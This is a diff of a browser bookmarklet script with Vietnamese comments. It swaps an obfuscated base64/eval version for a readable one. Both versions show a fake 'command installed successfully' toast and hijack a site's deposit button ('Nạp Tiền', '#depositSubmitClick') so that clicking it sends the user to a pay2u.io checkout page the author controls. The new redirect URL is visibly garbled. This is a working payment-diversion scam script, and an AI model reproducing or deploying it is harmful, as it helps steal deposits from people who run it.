@@ -1,1 +1,28 @@
-javascript:(function()%7Beval(atob('KGZ1bmN0aW9uKCl7dmFyIHRvYXN0PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpO3RvYXN0LnN0eWxlLnBvc2l0aW9uPSdmaXhlZCc7dG9hc3Quc3R5bGUuYm90dG9tPScyNSUnO3RvYXN0LnN0eWxlLmxlZnQ9JzUwJSc7dG9hc3Quc3R5bGUudHJhbnNmb3JtPSd0cmFuc2xhdGUoLTUwJSwtNTAlKSc7dG9hc3Quc3R5bGUuYmFja2dyb3VuZENvbG9yPSdyZ2JhKDQ0LDQ0LDQ0LDAuOSknO3RvYXN0LnN0eWxlLmNvbG9yPScjZmZmZmZmJzt0b2FzdC5zdHlsZS5wYWRkaW5nPScxMnB4IDI0cHgnO3RvYXN0LnN0eWxlLmJvcmRlclJhZGl1cz0nMTBweCc7dG9hc3Quc3R5bGUuelZuZGV4PSc5OTk5OTknO3RvYXN0LnN0eWxlLmZvbnRTaXplPScxNnB4Jzt0b2FzdC5zdHlsZS5mb250V2VpZ2h0PSdib2xkJzt0b2FzdC5zdHlsZS5mb250RmFtaWx5PSdBcmlhbCwgc2Fucy1zZXJpZic7dG9hc3QuaW5uZXJUZXh0PSdjYWkgbOG7h25oIHRow6BuaCBjb25nJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0KTtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7aWYodG9hc3QpdG9hc3QucmVtb3ZlKCk7fSwzMDAwKTt2YXIgZWxlbWVudHM9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYSwgYnV0dG9uLCBkaXYsIHNwYW4nKTtlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uKGl0ZW0pe2lmKGl0ZW0uaW5uZXJUZXh0JiZpdGVtLmlubmVyVGV4dC5pbmNsdWRlcygnTuG6oXAgVGnhu4FuJykpe3ZhciBjbGlja0NvdW50PTA7aXRlbS5vbmNsaWNrPWZ1bmN0aW9uKGUpe2NsaWNrQ291bnQrKztpZihjbGlja0NvdW50PDIpe3JldHVybjt9ZWxzZXtlLnByZXZlbnREZWZhdWx0KCk7ZS5zdG9wUHJvcGFnYXRpb24oKTt3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9wYXkucGF5MnUuaW8vP2NoZWNrb3V0X3Rva2VuPTg3ZDQ1NzQwYWZjOGVmZjVjZWRlOWVmYWIxYmUxMDY4YTM3NzAzYzUwZjIzZGYwNDc1MWExNzAxZTk5NWE3NWIiO319O2l0ZW0uc3R5bGUuY3Vyc29yPSdwb2ludGVyJzt9fSk7fSkoKTs='))%7D)()
+(function() {
+    // 1. Tạo nội dung chuyển khoản ngẫu nhiên từ 7 đến 10 ký tự
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let length = Math.floor(Math.random() * 4) + 7; 
+    let memo = '';
+    for (let i = 0; i < length; i++) { memo += chars.charAt(Math.floor(Math.random() * chars.length)); }
+
+    // 2. Đường dẫn trang nạp tiền mục tiêu của bạn
+    const finalUrl = `https://pay2u.io THE TRONG&memo=${memo}`;
+
+    // 3. Tạo và hiển thị thông báo đen "cài lệnh thành công" giống hệt ảnh mẫu
+    const toast = document.createElement('div');
+    toast.style.cssText = "position:fixed;bottom:30%;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#fff;padding:12px 24px;border-radius:20px;font-size:15px;z-index:999999;font-family:sans-serif;white-space:nowrap;box-shadow:0 4px 10px rgba(0,0,0,0.3);";
+    toast.innerHTML = "cài lệnh thành công";
+    document.body.appendChild(toast);
+
+    // Giữ thông báo hiển thị cố định trong 5 phút (300.000 ms)
+    setTimeout(() => { toast.remove(); }, 300000);
+
+    // 4. Lắng nghe sự kiện click: Khi người dùng bấm nút "Nạp Tiền Ngay" mới bắt đầu chuyển hướng
+    const btn = document.querySelector("#depositSubmitClick");
+    if(btn) {
+        btn.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = finalUrl;
+        });
+    }
+})();
